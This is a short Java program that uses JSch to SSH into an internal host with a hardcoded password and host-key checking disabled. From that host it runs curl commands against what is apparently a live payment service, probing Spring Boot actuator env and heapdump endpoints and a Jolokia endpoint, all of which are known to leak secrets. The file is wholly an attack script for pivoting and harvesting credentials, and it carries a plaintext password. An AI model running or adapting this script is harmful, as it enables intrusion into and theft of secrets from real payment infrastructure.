import com.jcraft.jsch.*;
import java.io.*;
class SSHZ {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("echo ---RESOLVE-PAYMENT---;curl -sk --resolve payment.accurate.id:443:10.14.16.50 https://payment.accurate.id/ 2>/dev/null | head -10;echo ---ACTUATOR-ENV---;curl -sk --resolve payment.accurate.id:443:10.14.16.50 https://payment.accurate.id/actuator/env 2>/dev/null | head -100;echo ---HEAPDUMP---;curl -sk --resolve payment.accurate.id:443:10.14.16.50 -o /dev/null -w '%{http_code}' https://payment.accurate.id/actuator/heapdump 2>/dev/null;echo ---JOLOKIA---;curl -sk --resolve payment.accurate.id:443:10.14.16.50 https://payment.accurate.id/jolokia/ 2>/dev/null | head -5");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
